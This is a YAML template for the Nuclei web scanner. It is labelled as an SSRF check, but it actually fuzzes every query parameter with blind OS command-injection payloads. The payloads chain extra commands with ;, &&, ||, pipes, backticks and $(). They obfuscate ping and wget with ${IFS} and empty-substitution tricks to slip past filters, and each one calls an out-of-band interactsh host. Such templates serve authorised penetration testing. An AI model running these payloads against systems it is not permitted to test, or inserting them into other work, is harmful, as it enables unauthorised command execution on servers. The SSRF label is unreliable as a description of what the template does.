id: ssrf_paramter

info:
  name: ssrf_paramter
  author: raff
  severity: high
  reference:
    - https://github.com/raoufmaklouf
  tags: ssrf

http:
  - method: GET
    path:
      - '{{BaseURL}}'

    payloads:
      nix_fuzz:
      - "xx;pin`echo${IFS}g`${IFS}{{interactsh-url}}"
      - "xx&&pin`echo${IFS}g`${IFS}{{interactsh-url}}"
      - "xx||pin`echo${IFS}g`${IFS}{{interactsh-url}}"
      - "xx&pin`echo${IFS}g`${IFS}{{interactsh-url}}"
      - "xx|pin`echo${IFS}g`${IFS}{{interactsh-url}}"
      - "xx$(pin`echo${IFS}g`${IFS}{{interactsh-url}})   "
      - "xx;pi$()ng {{interactsh-url}} "
      - "xx&&pi$()ng {{interactsh-url}}"
      - "xx||pi$()ng {{interactsh-url}}"
      - "xx&pi$()ng {{interactsh-url}}"
      - "xx|pi$()ng {{interactsh-url}}"
      - "xx`pi$()ng {{interactsh-url}}`"
      - "xx$(pi$()ng {{interactsh-url}})"
      - "xx;wg`echo${IFS}et`${IFS}{{interactsh-url}}"
      - "xx&&wg`echo${IFS}et`${IFS}{{interactsh-url}}"
      - "xx||wg`echo${IFS}et`${IFS}{{interactsh-url}}" 
      - "xx&wg`echo${IFS}et`${IFS}{{interactsh-url}}"
      - "xx|wg`echo${IFS}et`${IFS}{{interactsh-url}}"
      - "xx`wg$()et${IFS}{{interactsh-url}}`"
      - "xx$(wg`echo${IFS}et`${IFS}{{interactsh-url}})"
      - "xx;wg$()et {{interactsh-url}}"
      - "xx&&wg$()et {{interactsh-url}}"
      - "xx||wg$()et {{interactsh-url}}"
      - "xx&wg$()et {{interactsh-url}}"
      - "xx|wg$()et {{interactsh-url}}"
      - "xx`wg$()et {{interactsh-url}}`"
      - "xx$(wg$()et {{interactsh-url}})"
    fuzzing:
      - part: query
        type: replace # replaces existing parameter value with fuzz payload
        mode: single # replaces all parameters value with fuzz payload
        fuzz:
          - '{{nix_fuzz}}'

    stop-at-first-match: true
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
        condition: or
